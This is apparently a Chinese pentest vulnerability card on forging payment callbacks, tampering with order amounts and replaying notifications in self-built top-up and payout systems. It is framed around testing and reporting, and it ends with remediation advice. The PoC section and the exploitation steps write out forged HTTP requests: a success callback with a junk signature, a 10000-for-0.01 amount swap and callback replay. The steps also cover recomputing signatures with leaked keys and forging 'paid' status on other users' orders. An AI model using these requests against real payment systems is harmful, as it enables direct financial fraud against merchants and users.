---
title: 支付回调伪造与金额篡改（资金面）
cve: 无（业务逻辑）
severity: critical
cvss: 9.1
product: 自研充值/代付回调（博彩、跑分、发卡站高发）
versions: 任意
ports: 80, 443
keywords: notify, callback, 伪造回调, 金额篡改, 重放, 验签, 跑分
verified: false
sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
---

## 指纹

- 下单接口返回 `payUrl` / `orderNo` / `amount` / `sign`；
- 回调地址形如 `/notify/alipay`、`/pay/callback`、`/api/recharge/notify`、`/api/daifu/notify`；
- 参数里同时出现 `amount`、`money`、`total_fee`、`trade_status`、`state`。

## 前置条件

- 能注册账号并发起一笔最小金额订单（用于观测回调格式与订单状态机）。
- 能拿到回调样例：常见于接口文档泄露（`/doc.html`、`/swagger-ui.html`）、日志泄露、或前端源码里的 `notify_url`。

## PoC（三种缺陷分开验）

```http
### A. 回调不验签 —— 直接伪造成功
POST /api/recharge/notify HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

orderNo=<自己的订单号>&amount=0.01&state=success&sign=whatever

### B. 金额取自信使请求 —— 下单金额被篡改
POST /api/recharge/create HTTP/1.1
Content-Type: application/json

{"amount":10000,"payAmount":0.01,"channel":"alipay"}

### C. 状态机可重放 —— 同一回调反复入账
（把 A 的请求原样重放 3 次，观察余额是否累加）
```

## 利用步骤

1. 建一笔最小金额订单 → 抓下单包与回调包，确认签名算法（`md5(key+amount)`？`RSA`？还是根本没有）。
2. 依次试 A/B/C；判定标准写死：**订单状态变化 + 余额变化**，两者同时成立才算。
3. 若签名存在但 key 泄露（`.env`、前端 JS、回调日志），直接本地重算签名。
4. 深一层：`orderNo` 可枚举 → 给他人订单伪造"已支付"（业务扰动，报告里写清影响面即可，别刷）。
5. 记录：订单号、金额、请求响应原文、余额前后对比；报告里明确"资金影响上限"按单笔 × 可重放次数估算。

## 修复与缓解（加固）

- 金额只信服务端订单表，回调里的 `amount` 仅作核对；不一致直接拒绝。
- 强制验签（RSA2 / 商户密钥），回调来源 IP 白名单（支付宝/微信/银行出口段）。
- 幂等：`orderNo` 唯一索引 + 状态机（pending→paid 只允许一次），重复回调直接返回成功但不入账。
- 对账任务：每日与渠道流水比对，发现差额告警。

## 参考

- OWASP Top 10 A04（Insecure Design）；支付宝/微信支付回调验签文档。
